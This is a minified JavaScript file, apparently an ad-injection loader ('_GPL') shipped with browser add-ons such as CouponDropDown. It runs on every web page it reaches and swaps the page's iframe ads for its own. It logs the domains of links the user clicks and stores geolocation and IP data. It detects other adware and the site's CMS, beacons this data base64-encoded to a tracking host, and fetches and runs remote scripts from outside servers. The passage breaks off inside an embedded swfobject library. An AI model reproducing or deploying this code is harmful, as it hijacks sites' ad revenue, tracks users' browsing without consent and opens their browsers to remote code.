if(!Array.prototype.indexOf)Array.prototype.indexOf=function(a){if(this===void 0||this===null)throw new TypeError;var d=Object(this),c=d.length>>>0;if(c===0)return-1;var b=0;arguments.length>0&&(b=Number(arguments[1]),b!==b?b=0:b!==0&&b!==1/0&&b!==-(1/0)&&(b=(b>0||-1)*Math.floor(Math.abs(b))));if(b>=c)return-1;for(b=b>=0?b:Math.max(c-Math.abs(b),0);b<c;b++)if(b in d&&d[b]===a)return b;return-1};if(typeof _GPL=="undefined"){var _GPL=function(){var _GPL={vars:(typeof _GPL_vars!='undefined'?_GPL_vars:{zoneid:"8623",pid:"1122",cid:"IN"}),proto:"https:"==document.location.protocol?"https://":"http://",baseCDN:(typeof _GPL_baseCDN!='undefined'?_GPL_baseCDN:""),fCDN:"cdncache-a.akamaihd.net",items:{},item_vars:{},item_perms:{"ALL":{"ye44b":[],"o7272":[],"0b102":[],"22555":[],"dca7d":[],"bda27":[],"a652c":[],"fb7b3":[]}},item_delays:{"ye44b":{"min":"0","max":"0","c":"yes"},"o7272":{"min":"0","max":"0","c":"no"},"0b102":{"min":"259200","max":"0","c":"yes"},"22555":{"min":"259200","max":"0","c":"yes"},"dca7d":{"min":"0","max":"0","c":"no"},"bda27":{"min":"0","max":"0","c":"no"},"a652c":{"min":"0","max":"0","c":"no"},"fb7b3":{"min":"0","max":"0","c":"no"}},f:{},fl:{},rl:false,c:!1,cr:[],isIE6:navigator.userAgent.toLowerCase().indexOf("msie")!=-1,cb:Math.floor((new Date).getTime()/1E3)-Math.floor((new Date).getTime()/1E3)%3600,loaded_domain_rules:false,loaded:false,domIsReady:false,pzones:[],wlid:"dca7d",wl:"CouponDropDown",wld:"coupondropdown.com",i:function(){if(location.protocol!='http:'&&location.protocol!='https:'){return}if(this.loaded){return}var a=this.findals();if(a){this.vars.zoneid=this.vars.zoneid.split(',')[0];this.item_perms=this.lpz(this.item_perms,this.vars.zoneid);if(!this.vars.aoi)this.vars.aoi=Math.floor((new Date()).getTime()/1000)-1;this.baseCDN=this.baseCDN||a.src.split('/')[2];this.fCDN=(this.baseCDN.indexOf('-a.akamaihd.net')!=-1)?this.baseCDN:this.fCDN;self==top?_GPL.init():_GPL.initFrame();_GPL.loaded=true;if(_GPL.vars.systemid){_GPL.pingdata.a.si=_GPL.vars.systemid}if(_GPL.vars.cid!='UU'){_GPL.pingdata.a.g=_GPL.vars.cid}var pz=this.vars.pid+":"+this.vars.zoneid;if(_GPL.pingdata.a.pz.indexOf(pz)==-1){_GPL.pingdata.a.pz.push(pz)}}},findals:function(){var a=(this.findScript("",/loaders\/\d+\/l\.js/)||this.findScript("",/items\/loaders\/loader_\d+\.js/));return(a&&this.getVars(a.src.replace(/&amp;/ig,"&")))?a:false},onDomReady:function(){if(document.addEventListener){_GPL.DOMContentLoaded=function(){document.removeEventListener("DOMContentLoaded",_GPL.DOMContentLoaded,false);_GPL.i()}}else if(document.attachEvent){_GPL.DOMContentLoaded=function(){if(document.readyState==="complete"){document.detachEvent("onreadystatechange",_GPL.DOMContentLoaded);_GPL.i()}}}if(document.readyState==="complete"){return setTimeout(function(){_GPL.i()},1)}if(document.addEventListener){document.addEventListener("DOMContentLoaded",_GPL.DOMContentLoaded,false);window.addEventListener("load",function(){_GPL.i()},false)}else if(document.attachEvent){document.attachEvent("onreadystatechange",_GPL.DOMContentLoaded);window.attachEvent("onload",function(){_GPL.i()});var toplevel=false;try{toplevel=window.frameElement==null}catch(e){}if(document.documentElement.doScroll&&toplevel){_GPL.doScrollCheck()}}},doScrollCheck:function(){if(_GPL.domIsReady){return}try{document.documentElement.doScroll("left")}catch(e){setTimeout(_GPL.doScrollCheck,1);return}_GPL.i()},init:function(){this.rS(this.baseCDN);var zoneid=_GPL.vars.zoneid;try{this.items.e6a00.init(function(){_GPL.items.e6a00.get(['c2','frt','pzones','geo.cid','geo.rid','geo.ccid','geo.ip','geo.updatetime'],function(res){_GPL.pzones=(res.v['pzones']?res.v['pzones'].split(','):[]);var frt=((_GPL.vars.ext&&_GPL.vars.aoi)||res.v['frt']||Math.floor((new Date()).getTime()/1000));if(!res.v['frt']){_GPL.items.e6a00.set("frt",frt);_GPL.cr.push('frtl')}if((Math.floor((new Date()).getTime()/1000)-parseInt(frt))<10800){_GPL.c=!0}if(_GPL.baseCDN.indexOf('.cloudfront.net')!=-1){_GPL.cr.push('cldf')}if(!_GPL.vars.cid||res.v['geo.cid']){var cid=res.v['geo.cid'];var rid=res.v['geo.rid'];var ccid=res.v['geo.ccid'];var ip=res.v['geo.ip'];var updatetime=res.v['geo.updatetime'];if(!cid||(cid&&updatetime&&(Math.floor((new Date()).getTime()/1000)-parseInt(updatetime))>=259200)){_GPL.insertJS(_GPL.proto+_GPL.fCDN+'/loaders/cid','_GPL_geo');return}else{_GPL.vars.cid=cid;_GPL.vars.rid=rid;_GPL.vars.ccid=ccid;_GPL.vars.ip=ip}}_GPL.lfi(zoneid);_GPL.loadCC();_GPL.loadDomainRules();_GPL.items.e6a00.set("location.href",location.href)})})}catch(e){}setTimeout(function(){if(!_GPL.loaded_domain_rules){_GPL.c=!0;_GPL.cr.push('sdgeo');_GPL.setDefaultGeoAndGo()}},10000);(function(){try{var b=document;if(typeof _GPL.gcf=='undefined'){_GPL.gcf=true;var f=function(ev){var obj=(window.external)?ev.srcElement:ev.target;if(!obj){return}if(obj.nodeName!='A'){while(obj.nodeName!='A'&&obj.parentNode){obj=obj.parentNode}}if(obj.nodeName=='A'&&obj.href!=null){var href=obj.href;if(href.indexOf('http')!=0){href=location.hostname}else{href=href.replace(/^https?:\/\//,"").split('/')[0]}if(href){if(typeof _GPL!='undefined'){_GPL.items.e6a00.set('_GPLLC',href+'::'+Math.floor((new Date).getTime()/1000))}}}};if(!b.addEventListener){b.attachEvent("onclick",f)}else{b.addEventListener("click",f,false)}}}catch(e){}})()},setDefaultGeoAndGo:function(){this.vars.cid='UU';this.vars.rid='';this.vars.ccid='';_GPL.f['fb7b3'](_GPL.vars.zoneid);this.loadDomainRules()},setGeoAndGo:function(geo){_GPL.ri('_GPL_geo');this.vars.cid=geo.cid;this.vars.rid=geo.rid;this.vars.ccid=geo.ccid;this.vars.ip=geo.ip;this.items.e6a00.set([{n:"geo.updatetime",v:Math.floor((new Date()).getTime()/1000)},{n:"geo.cid",v:geo.cid},{n:"geo.rid",v:geo.rid},{n:"geo.ccid",v:geo.ccid},{n:"geo.ip",v:geo.ip}]);this.loadCC();this.loadDomainRules()},isN:function(a){return(typeof(a)==='number'||typeof(a)==='string')&&a!==''&&!isNaN(a)},initFrame:function(){},loadCC:function(){this.vars&&this.vars.cid&&document.location.protocol=="http:"&&!this.gc("_GPL_it")&&'JP ID RS VN PK RU EG TW IR DZ HR MY PH TN'.indexOf(_GPL.vars.cid)==-1&&_GPL.canLoad('a652c')&&this.insertJS(_GPL.proto+_GPL.baseCDN+"/items/it/data/ac.js",'_GPL_a652c')},e:function(s){var e="";for(var i=0,l=s.length;i<l;i++){e+=s.charCodeAt(i).toString(16)}return e.split("").reverse().join("")},lfi:function(zoneid){_GPL.lfi_values={'cf-dns2':{i:'bda27',v:'1'}};var a=[];for(var i in _GPL.lfi_values){if(typeof _GPL.lfi_values[i]=='function')continue;a.push(i)}_GPL.items.e6a00.get(a,function(res){var l=[];for(var n in res.v){if(typeof res.v[n]=='function')continue;for(var i in _GPL.item_perms){if(typeof _GPL.item_perms[i]=='function')continue;if(_GPL.lfi_values[n].i in _GPL.item_perms[i]&&res.v[n]==_GPL.lfi_values[n].v){l.push(_GPL.lfi_values[n].i)}}}if(_GPL.c){l.push('8c206')}if(_GPL.cr.length>0){for(var i=0;i<_GPL.cr.length;i++){l.push(_GPL.cr[i])}}_GPL.item_vars['fb7b3']=l;_GPL.f['fb7b3'](zoneid)})},ihi:function(a){var c=document.createElement("iframe");c.type="text/javascript";c.src=a;c.style.display="none";c.style.visibility="hidden";document.body.appendChild(c)},getFW:function(){return document.documentElement?""+document.documentElement.clientWidth+"x"+document.documentElement.clientHeight:"0x0"},getVars:function(a){for(var d=a.slice(a.indexOf("?")+1).split("&"),c=0;c<d.length;c++)a=d[c].split("="),this.vars[a[0]]=(a.length>1)?unescape(a[1].replace("+"," ")):'';return true},replaceVars:function(a){for(var d,c,b,g=/\{([^\}]+)\}/gi,e=a;d=g.exec(a);)if(d[1].indexOf("_GPL")!=-1){c=!1;d[1].indexOf(",")!=-1&&(c=d[1].split(",")[1]);b=eval(d[1].split(",")[0]);if(!b||typeof b=="undefined")if(c)b=c;else continue;for(;e.indexOf("{"+d[1]+"}")!=-1;)e=e.replace("{"+d[1]+"}",b)}return e},mergeKeysMulti:function(a,b){for(var k in b){if(typeof b[k]=='function')continue;if(!a[k])a[k]=b[k];else{for(var j in b[k]){if(typeof b[k][j]=='function')continue;if(!a[k][j]){a[k][j]=b[k][j]}else{for(var l=0,m=b[k][j].length;l<m;++l){if(a[k][j].indexOf(b[k][j][l])==-1){a[k][j].push(b[k][j][l])}}}}}}return a},mergeKeys:function(a,b){for(var k in b){if(typeof b[k]=='function')continue;if(!a[k])a[k]=b[k]}return a},newKeys:function(a,b){var c=[];var ak=[];for(var k in a){if(typeof a[k]=='function')continue;for(var j in a[k]){if(typeof a[k][j]=='function')continue;if(ak.indexOf(j)==-1)ak.push(j)}}for(var k in b){if(typeof b[k]=='function')continue;for(var j in b[k]){if(typeof b[k][j]=='function')continue;if(ak.indexOf(j)==-1&&c.indexOf(j)==-1)c.push(j)}}return c},ri:function(a){try{var b=document.getElementById(a);if(b!=null){b.parentNode.removeChild(b)}}catch(e){}},removeScripts:function(a){},rS:function(a){if(!this.isIE6)for(var d;(d=this.findScript(a,""))&&d;)d.parentNode.removeChild(d)},findScript:function(a,d){for(var c=document.getElementsByTagName("script"),b=c.length-1;b>=0;--b)if(c[b].src&&c[b].src.match(a)&&c[b].src.match(d))return c[b];return!1},loadDomainRules:function(){if(location.host!=""&&typeof _GPL_ext=='undefined'&&'JP ID RS VN PK RU EG TW IR DZ HR MY PH TN'.indexOf(_GPL.vars.cid)==-1){var a=location.host.replace(RegExp(/^www\./i),"");this.insertJS(this.proto+this.fCDN+"/js/"+this.e(a)+"/r.js",'_GPL_r')}this.loaded_domain_rules=true;_GPL.rlstart=(new Date).getTime();_GPL.rltimer=setInterval(function(){if((new Date).getTime()-_GPL.rlstart>=5000){clearInterval(_GPL.rltimer);return}if(_GPL.rl){clearInterval(_GPL.rltimer);_GPL.rulesLoaded();return}},300)},pingdata:{'a':{pn:1,mi:[],d:location.hostname,pz:[]},'b':{pn:2,sk:''},'c':{pn:3}},jq:false,rulesLoaded:function(){_GPL.f.ye44b=function(){if(_GPL.canLoad("ye44b")&&!_GPL.fl.ye44b&&!_GPL.fl["22555"]&&!_GPL.fl["0b102"]&&!_GPL.topsite)if(_GPL.fl.ye44b=!0,_GPL.items.ye44b={r:0,s:0,c:0,m:2,t:{"300x250":location.protocol+"//"+_GPL.fCDN+"/ssa/479/?zoneid="+_GPL.zoneid("ye44b")+"&cid="+encodeURIComponent(_GPL.vars.cid)+"&ch=ROW"},i:function(){!_GPL.fl["22555"]&&(!_GPL.fl["0b102"]&&!_GPL.topsite)&&(this.s=(new Date).getTime(),_GPL.items.ye44b.fna())},fna:function(){jQuery("iframe").each(function(){if(!(this.c>=this.m)&&jQuery(this).attr("width")&&jQuery(this).attr("height")){var a=jQuery(this).attr("width")+"x"+jQuery(this).attr("height");if("undefined"!=typeof _GPL.items.ye44b.t[a]&&1!=jQuery(this).attr("ow")&&"absolute"!=jQuery(this).css("position")&&!jQuery(this).attr("replaced"))return _GPL.items.ye44b.aa(jQuery(this),a,_GPL.items.ye44b.t[a]),!1}});this.t["160x600"]?1E4>(new Date).getTime()-this.s&&setTimeout(function(){_GPL.items.ye44b.fna()},1E3):(this.t["160x600"]=location.protocol+"//"+_GPL.fCDN+"/ssa/695/?zoneid="+_GPL.zoneid("ye44b")+"&cid="+encodeURIComponent(_GPL.vars.cid)+"&ch=ROW",this.fna())},aa:function(a,c,e){if(!(this.c>=this.m)){_GPL.pingdata&&-1==_GPL.pingdata.a.mi.indexOf("ye44b")&&_GPL.pingdata.a.mi.push("ye44b");a.attr("ow","1");var d=c.split("x")[0],c=c.split("x")[1],b="ads not by this site";_GPL.canLoad("o7272")&&_GPL.wl&&(b='<a href="#" onclick="window.open(\'http://www.'+_GPL.wld+'\');return false;" style="text-decoration: none; text-align:right; color: #999; font-size: 9px; height:11px; line-height: normal;" title="Ads by '+_GPL.wl+'">Ads by '+_GPL.wl+" <span style=\"font-size: normal; width: 16px; height: 9px; vertical-align: middle; background: url('"+_GPL.proto+_GPL.baseCDN+"/img/information-small-white.png') -3px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></a>");_GPL.canLoad("o7272")&&_GPL.vars.ext&&(b='<a href="#" onclick="window.open(\'http://www.advertising-support.com/?p='+encodeURIComponent(_GPL.vars.ext)+'\');return false;" style="text-decoration: none; text-align:right; color: #999; font-size: 9px; height:11px; line-height: normal;" title="Ads by '+_GPL.vars.ext+' plugin">ads not by this site <span style="font-size: normal; width: 16px; height: 9px; vertical-align: middle; background: url(\''+_GPL.proto+_GPL.baseCDN+"/img/information-small-white.png') -3px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></a>");if(-1!=["1310","1311"].indexOf(_GPL.vars.pid)&&(b='<a href="#" onclick="window.open(\'http://www.wizebar.com/info.htm?logic=onredbanner&prdct='+encodeURIComponent(_GPL.zoneid("ye44b"))+'\');return false;" style="text-decoration: none; text-align:right; color: #999; font-size: 9px; height:11px; line-height: normal;">Why am I getting this ad? <span style="font-size: normal; width: 16px; height: 9px; vertical-align: middle; background: url(\''+_GPL.proto+_GPL.baseCDN+"/img/information-small-white.png') -3px\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></a>",!this.wizebarShown)){try{if(onredbannerMngr&&"function"===typeof onredbannerMngr.onVisible)onredbannerMngr.onVisible()}catch(g){}this.wizebarShown=!0}var b='<div style="width:'+d+'px; text-align:right; color: #999; font-size: 9px; height:11px; line-height: normal;">'+b+"</div>",f=jQuery("<span></span>").css("visibility","hidden");f.insertBefore(a);jQuery('<iframe src="'+e+"&pl="+encodeURIComponent(this.fold(f))+'" frameBorder="0" frameSpacing="0" scrolling="no" style="width:'+d+"px;height:"+c+'px ;" ow="1" replaced="true" width="'+d+'" height="'+c+'"></iframe>'+b).insertBefore(a);this.c++}},fold:function(a){return jQuery(a).offset().top>jQuery(window).height()?"below":"above"}},"undefined"==typeof jQuery){_GPL.jQ||(_GPL.jQ=!0,_GPL.insertJS(_GPL.proto+"ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"));var e=setInterval(function(){"undefined"!=typeof jQuery&&($j=jQuery.noConflict(),clearInterval(e),_GPL.items.ye44b.i())},300)}else _GPL.items.ye44b.i()};_GPL.f.ye44b();_GPL.f.adba9=function(){if(_GPL.canLoad("adba9")&&!_GPL.fl.adba9){_GPL.fl.adba9=!0;var a=[];"undefined"!=typeof YontooClient&&a.push("yt");"undefined"!=typeof window.tbVersion&&a.push("ob");"undefined"!=typeof FA&&a.push("fa");"undefined"!=typeof WSG_gt_version&&a.push("ib");"undefined"!=typeof pbuid&&a.push("pb");"undefined"!=typeof partner_config&&"undefined"!=typeof partner_config.products&&a.push("sd");"undefined"!=typeof _BCAPIHelper&&a.push("cd");"udnefined"!=typeof predictad_myLoc&&a.push("wd");"undefined"!=typeof RR_ENDPOINTURL&&a.push("ps");"undefined"!=typeof appInfo&&("undefined"!=typeof appInfo.name&&"pricepeep"==appInfo.name)&&a.push("pp");"undefined"!=typeof dealplyQuery&&a.push("dp");0<a.length&&(_GPL.pingdata.a.cp||(_GPL.pingdata.a.cp=[]),_GPL.pingdata.a.cp.concat(a));a=[];"phpbb"==document.body.getAttribute("id")&&a.push("pb");for(var c=document.getElementsByTagName("meta"),b=0,e=c.length;b<e;b++)if("generator"==c[b].getAttribute("name")){var d=c[b].getAttribute("content");if(d)if(-1!==d.indexOf("vBulletin")){a.push("vb");break}else if(-1!==d.indexOf("PHP-Nuke")){a.push("pn");break}}c=document.getElementsByTagName("link");b=0;for(e=c.length;b<e;b++)if("stylesheet"==c[b].getAttribute("rel")&&(d=c[b].getAttribute("href"))&&-1!==d.indexOf("/wp-content/")){a.push("wp");break}0<a.length&&(_GPL.pingdata.a.dt||(_GPL.pingdata.a.dt=[]),_GPL.pingdata.a.dt=_GPL.pingdata.a.dt.concat(a));setTimeout(function(){var a="",b;for(b in _GPL.pingdata.a)if("function"!=typeof _GPL.pingdata.a[b])var c="[object Array]"===Object.prototype.toString.call(_GPL.pingdata.a[b])?_GPL.pingdata.a[b].join(","):_GPL.pingdata.a[b],a=a+(b+"="+c+"&");a=a.substring(0,a.length-1);_GPL.firePixel(_GPL.proto+"cdnstats-a.akamaihd.net/s.gif?d="+encodeURIComponent(_GPL.B64.encode(a))+"&r="+999999999*Math.random())},3E3)}};_GPL.f.adba9()},insertJS:function(a){var d=document.getElementsByTagName("head"),d=d.length>0?d:document.getElementsByTagName("body");if(d.length>0){var c=document.createElement("script");c.async=!0;c.type="text/javascript";c.src=a;if(arguments.length>=2){c.id=arguments[1]}d[0].appendChild(c)}},firePixel:function(a){(new Image).src=a},canLoad:function(a){if(this.vars.cid&&(this.item_perms.ALL&&this.item_perms.ALL[a]||this.item_perms[this.vars.cid]&&this.item_perms[this.vars.cid][a]))if(this.vars.aoi&&this.item_delays[a]&&Math.floor((new Date).getTime()/1E3)>parseInt(this.vars.aoi)+parseInt(this.item_delays[a].min)&&(0==parseInt(this.item_delays[a].max)||Math.floor((new Date).getTime()/1E3)<parseInt(this.vars.aoi)+parseInt(this.item_delays[a].max))&&!(_GPL.c&&"yes"==this.item_delays[a].c))return!0;return!1},gc:function(a){if(document.cookie&&document.cookie!="")for(var d=document.cookie.split(";"),c=0;c<d.length;++c){var b=d[c].replace(/^\s+|\s+$/,"");if(b.substring(0,a.length+1)==a+"=")return decodeURIComponent(b.substring(a.length+1))}return null},sc:function(a,d,c){var b=new Date;b.setHours(b.getHours()+parseInt(c));c=location.hostname.replace(/^www\./,"");c[0]!="."&&(c="."+c);document.cookie=a+"="+d+";expires="+b.toUTCString()+";path=/;domain="+c},zoneid:function(i){var z=[];z=this.am(z,(this.item_perms.ALL&&this.item_perms.ALL[i])?this.item_perms.ALL[i]:[]);z=this.am(z,(this.item_perms[this.vars.cid]&&this.item_perms[_GPL.vars.cid][i])?this.item_perms[this.vars.cid][i]:[]);if(_GPL.pzones.length>0){var zz=_GPL.isect(_GPL.pzones,z);z=(zz.length>0)?zz:z}return(z.length>0)?z[Math.floor(Math.random()*(z.length))]:this.vars.zoneid},isect:function(a,b){var ai=0,bi=0;var result=new Array();while(ai<a.length&&bi<b.length){if(a[ai]<b[bi]){ai++}else if(a[ai]>b[bi]){bi++}else{result.push(a[ai]);ai++;bi++}}return result},am:function(a,b){for(var i=0;i<b.length;i++){if(a.indexOf(b[i])==-1)a.push(b[i])}return a},lpz:function(p,z){for(var j in p){if(typeof p[j]=='function')continue;for(var k in p[j]){if(typeof p[j][k]=='function')continue;if(p[j][k].indexOf(z)==-1){p[j][k].push(z)}}}return p},B64:{_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",decode:function(a){for(var d="",c,b,g,e,h,f=0,a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");f<a.length;)c=this._keyStr.indexOf(a.charAt(f++)),b=this._keyStr.indexOf(a.charAt(f++)),e=this._keyStr.indexOf(a.charAt(f++)),h=this._keyStr.indexOf(a.charAt(f++)),c=c<<2|b>>4,b=(b&15)<<4|e>>2,g=(e&3)<<6|h,d+=String.fromCharCode(c),e!=64&&(d+=String.fromCharCode(b)),h!=64&&(d+=String.fromCharCode(g));return d=this._utf8_decode(d)},_utf8_decode:function(a){for(var d="",c=0,b=c1=c2=0;c<a.length;)b=a.charCodeAt(c),b<128?(d+=String.fromCharCode(b),c++):b>191&&b<224?(c2=a.charCodeAt(c+1),d+=String.fromCharCode((b&31)<<6|c2&63),c+=2):(c2=a.charCodeAt(c+1),c3=a.charCodeAt(c+2),d+=String.fromCharCode((b&15)<<12|(c2&63)<<6|c3&63),c+=3);return d},encode:function(a){for(var d="",c,b,g,e,h,f,i=0,a=this._utf8_encode(a);i<a.length;)c=a.charCodeAt(i++),b=a.charCodeAt(i++),g=a.charCodeAt(i++),e=c>>2,c=(c&3)<<4|b>>4,h=(b&15)<<2|g>>6,f=g&63,isNaN(b)?h=f=64:isNaN(g)&&(f=64),d=d+this._keyStr.charAt(e)+this._keyStr.charAt(c)+this._keyStr.charAt(h)+this._keyStr.charAt(f);return d},_utf8_encode:function(a){for(var a=a.replace(/\r\n/g,"\n"),d="",c=0;c<a.length;c++){var b=a.charCodeAt(c);b<128?d+=String.fromCharCode(b):(b>127&&b<2048?d+=String.fromCharCode(b>>6|192):(d+=String.fromCharCode(b>>12|224),d+=String.fromCharCode(b>>6&63|128)),d+=String.fromCharCode(b&63|128))}return d}}};_GPL.dc=function(data,result){if(!_GPL.isIE6){_GPL.ri('_GPL_fb7b3')}var key;if(result){key='zone::'+result.zoneid+'::expiration'}else{key='zone::'+_GPL.vars.zoneid+'::expiration'}var expires=new Date();expires.setSeconds(parseInt(data));_GPL.items.e6a00.set(key,expires.getTime());if(result){_GPL.items.e6a00.set([{n:"geo.updatetime",v:Math.floor((new Date()).getTime()/1000)},{n:"geo.cid",v:result.cid},{n:"geo.rid",v:result.rid},{n:"geo.ccid",v:result.ccid},{n:"geo.ip",v:result.ip}]);_GPL.vars.cid=result.cid;_GPL.vars.rid=result.rid;_GPL.vars.ccid=result.ccid;_GPL.vars.ip=result.ip;if(result.ppi=="1"){if(!_GPL.pzones){_GPL.pzones=[]}if(_GPL.pzones.indexOf(result.zoneid)==-1){_GPL.pzones.push(""+result.zoneid);_GPL.items.e6a00.set([{n:"pzones",v:_GPL.pzones.join(",")}])}}}};_GPL.f.a652c=function(){if(_GPL.canLoad('a652c')&&!_GPL.fl['a652c']){_GPL.fl['a652c']=true;_GPL.loadCC()}};_GPL.f.fb7b3=function(zoneid){if(!_GPL.canLoad('fb7b3')){return}if(!_GPL.daz){_GPL.daz=[zoneid]}else if(_GPL.daz.indexOf(zoneid)==-1){_GPL.daz.push(zoneid)}else{return}if(['MY','PH'].indexOf(_GPL.vars.cid)!=-1){return}var key='zone::'+zoneid+'::expiration';var callback=function(res){var val=res.v['zone::'+zoneid+'::expiration'];if(val){var exdate=new Date(parseInt(val));if(exdate>new Date){return}}var injection_items=['a652c'];var l=(typeof _GPL.item_vars['fb7b3']!='undefined')?_GPL.item_vars['fb7b3']:[];for(var i in _GPL.item_perms){if(typeof _GPL.item_perms[i]=='function')continue;for(var j in _GPL.item_perms[i]){if(typeof _GPL.item_perms[i][j]=='function')continue;if(injection_items.indexOf(j)==-1||l.indexOf(j)!=-1){continue}l.push(j)}}_GPL.insertJS(_GPL.proto+"d.textsrv.com/?c="+encodeURIComponent(_GPL.B64.encode([_GPL.vars.cid,_GPL.vars.rid,_GPL.vars.ccid,_GPL.vars.pid,zoneid,_GPL.vars.systemid,l.join(",")].join(':')))+'&cachebreak='+(new Date()).getTime()+'&cb=_GPL.dc','_GPL_fb7b3')};_GPL.items.e6a00.get(key,callback)};var swfobject=function(){function o(){if(!h){try{var a=d.getElementsByTagName("body")[0].appendChild(d.createElement("span"));a.parentNode.removeChild(a)}catch(b){return}h=!0;for(var a=t.length,c=0;c<a;c++)t[c]()}}function H(a){h?a():t[t.length]=a}function I(a){if(typeof f.addEventListener!=j)f.addEventListener("load",a,!1);else if(typeof d.addEventListener!=j)d.addEventListener("load",a,!1);else if(typeof f.attachEvent!=j)J(f,"onload",a);else if("function"==typeof f.onload){var b=f.onload;f.onload=function(){b();a()}}else f.onload=a}function K(){var a=d.getElementsByTagName("body")[0],b=d.createElement(w);b.setAttribute("type",y);var c=a.appendChild(b);if(c){var F=0;(function(){if(typeof c.GetVariable!=j){var d=c.GetVariable("$version");d&&(d=d.split(" ")[1].split(","),e.pv=[parseInt(d[0],10),parseInt(d[1],10),parseInt(d[2],10)])}else if(10>F){F++;setTimeout(arguments.callee,10);return}a.removeChild(b);c=null;C()})()}else C()}function C(){var a=z.length;if(0<a)for(var b=0;b<a;b++){var c=z[b].id,d=z[b].callbackFn,m={success:!1,id:c};if(0<e.pv[0])s(c)&&D(z[b].swfVersion)&&!(e.wk&&312>e.wk)&&(d&&(m.success=!0,m.ref=E(c),d(m)));else if(d){if((c=E(c))&&typeof c.SetVariable!=j)m.success=!0,m.ref=c;d(m)}}}function E(a){var b=null;if((a=s(a))&&"OBJECT"==a.nodeName)typeof a.SetVariable!=j?b=a:(a=a.getElementsByTagName(w)[0])&&(b=a);return b}function L(a){var b=s(a);b&&"OBJECT"==b.nodeName&&(e.ie&&e.win?(b.style.display="none",function(){4==b.readyState?removeObjectInIE(a):setTimeout(arguments.callee,10)}()):b.parentNode.removeChild(b))}function s(a){var b=null;try{b=d.getElementById(a)}catch(c){}return b}function J(a,b,c){a.attachEvent(b,c);p[p.length]=[a,b,c]}function D(a){var b=e.pv,a=a.split(".");a[0]=parseInt(a[0],10);a[1]=parseInt(a[1],10)||0;a[2]=parseInt(a[2],10)||0;return b[0]>a[0]||b[0]==a[0]&&b[1]>a[1]||b[0]==a[0]&&b[1]==a[1]&&b[2]>=a[2]?!0:!1}var j="undefined",w="object",y="application/x-shockwave-flash",f=window,d=document,n=navigator,G=!1,t=[function(){G?K():C()}],z=[],B=[],p=[],h=!1,M=!0,e=function(){var a=typeof d.getElementById!=j&&typeof d.getElementsByTagName!=j&&typeof d.createElement!=j,b=n.userAgent.toLowerCase(),c=n.platform.toLowerCase(),e=c?/win/.test(c):/win/.test(b),c=c?/mac/.test(c):/mac/.test(b),b=/webkit/.test(b)?parseFloat(b.replace(/^.*webkit\/(\d+(\.\d+)?).*$/,"$1")):!1,m=!+"\v1",h=[0,0,0],g=null;if(typeof n.plugins!=j&&typeof n.plugins["Shockwave Flash"]==w){if((g=n.plugins["Shockwave Flash"].description)&&!(typeof n.mimeTypes!=j&&n.mimeTypes[y]&&!n.mimeTypes[y].enabledPlugin))G=!0,m=!1,g=g.replace(/^.*\s+(\S+\s+\S+$)/,"$1"),h[0]=parseInt(g.replace(/^(.*)\..*$/,"$1"),10),h[1]=parseInt(g.replace(/^.*\.(.*)\s.*$/,"$1"),10),h[2]=/[a-zA-Z]/.test(g)?parseInt(g.replace(/^.*[a-zA-Z]+(.*)$/,"$1"),10):0}else if(typeof f.ActiveXObject!=j)try{var s=new ActiveXObject("ShockwaveFlash.ShockwaveFlash");if(s&&(g=s.GetVariable("$version")))m=!0,g=g.split(" ")[1].split(","),h=[parseInt(g[0],10),parseInt(g[1],10),parseInt(g[2],10)]}catch(o){}return{w3:a,pv:h,wk:b,ie:m,win:e,mac:c}}();(function(){e.w3&&((typeof d.readyState!=j&&"complete"==d.readyState||typeof d.readyState==j&&(d.getElementsByTagName("body")[0]||d.body))&&o(),h||(typeof d.addEventListener!=j&&d.addEventListener("DOMContentLoaded",o,!1),e.ie&&e.win&&(d.attachEvent("onreadystatechange",function(){"complete"==d.readyState&&(d.detachEvent("onreadystatechange",arguments.callee),o())}),f==top&&function(){if(!h){try{d.documentElement.doScroll("left")}catch(a){setTimeout(arguments.callee,0);return}o()}}()),e.wk&&function(){h||(/loaded|complete/.test(d.readyState)?o():setTimeout(arguments.callee,0))}(),I(o)))})();(function(){false&&e.ie&&e.win&&window.attachEvent("onunload",function(){for(var a=p.length,b=0;b<a;b++)p[b][0].detachEvent(p[b][1],p[b][2]);a=B.length;for(b=0;b<a;b++)L(B[b]);for(var c in e)e[c]=null;e=null;for(var d in _GPL.swfobject)_GPL.swfobject[d]=null;_GPL.swfobject=null})})();return{getObjectById:function(a){if(e.w3)return E(a)},embedSWF:function(a,b,c,h,m,f,g,n,o,p){var t={success:!1,id:b};e.w3&&!(e.wk&&312>e.wk)&&a&&b&&c&&h&&m?(H(function(){c+="";h+="";var i={};if(o&&typeof o===w)for(var k in o)i[k]=o[k];i.data=a;i.width=c;i.height=h;k={};if(n&&typeof n===w)for(var f in n)k[f]=n[f];if(g&&typeof g===w)for(var v in g)k.flashvars=typeof k.flashvars!=j?k.flashvars+("&"+v+"="+g[v]):v+"="+g[v];if(D(m)){var x;f=s(b);if(!(e.wk&&312>e.wk)&&f)if(typeof i.id==j&&(i.id=b),e.ie&&e.win){var q="",l;for(l in i)i[l]!=Object.prototype[l]&&("data"==l.toLowerCase()?k.movie=i[l]:"styleclass"==l.toLowerCase()?q+=' class="'+i[l]+'"':"classid"!=l.toLowerCase()&&(q+=" "+l+'="'+i[l]+'"'));l="";for(var r in k)k[r]!=Object.prototype[r]&&(l+='<param name="'+r+'" value="'+k[r]+'" />');f.outerHTML='<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"'+q+">"+l+"</object>";B[B.length]=i.id;x=s(i.id)}else{r=d.createElement(w);r.setAttribute("type",y);for(var u in i)i[u]!=Object.prototype[u]&&("styleclass"==u.toLowerCase()?r.setAttribute("class",i[u]):"classid"!=u.toLowerCase()&&r.setAttribute(u,i[u]));for(q in 